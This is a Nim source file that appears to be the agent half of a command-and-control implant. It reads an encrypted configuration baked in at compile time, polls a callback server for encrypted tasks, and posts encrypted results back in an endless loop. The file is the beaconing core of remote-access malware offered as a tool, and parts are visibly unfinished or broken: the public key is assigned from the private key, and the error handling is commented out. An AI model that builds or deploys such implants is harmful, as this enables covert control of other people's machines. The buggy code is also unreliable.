import asyncdispatch, asyncnet
import sysrandom
import std/base64
import std/strutils
import std/os
#third party libraries
import puppy #http comms library
import monocypher
import protocol
import flatty
import tasks
import urlly
import config
import configjs
import types 

import std/[streams, osproc]

const LOOKUP_TABLE =
    when defined(release):
        staticRead("../release.config")
    else:
        staticRead("../debug.config")

# removes null characters from the url string
proc rmURLNulls(url: string): string =
  var newUrl = ""
  for c in url:
    if c != '\0':
      newUrl.add(c)
  return newUrl

#retrieves task for the agent and returns the task and senders public key  
#TODO error handle transport failures, enc failures, b64 failures
proc getTasks(agent: StaticConfig, privKey: Key): (Task,Key) = 
  let url = urlly.parseUrl(rmURLNulls(agent.callback))
  echo "get task: ", $url
  let b64SerEncSerTask = fetch($url)
  # unwraps a task structure from the response
  let (task,senderPubKey) = decodeTask(b64SerEncSerTask,privKey)
  return (task,senderPubKey)
  
#posts the task results for the agent
proc postResult(agent: StaticConfig, 
                privKey: Key, 
                senderPubKey: Key,
                resp: Resp): string = 
  let url = urlly.parseUrl(rmURLNulls(agent.callback))

  #TODO error handle transport failures, enc failures, b64 failures
  let b64SerEncMsg = encodeResp(resp, privKey, senderPubKey)

  echo "post response: ", $url
  let response = post(
      $url,
      @[("Content-Type", "application/json")],
      b64SerEncMsg
  )   
  return response.body

proc main() =
  let ub64Str = unb64str(LOOKUP_TABLE)
  let encConfig = ub64Str.fromFlatty(EncConfig)
  let context = readEncConfig(encConfig)
  
  let pubKey = encConfig.privKey
  let privKey = encConfig.privKey
  echo context.callback
  while(true):
    # try: 
      let (task,taskerPubKey) = getTasks(context,privKey)
      let taskId = task.taskId
      let body = Resp(taskId: taskId, resp: "COMPLETE")
      let result = postResult(context, privKey, taskerPubKey,body)
      echo result
    # except PuppyError: #TODO add error logging, handling
      echo "error"

when isMainModule:
  
  main()
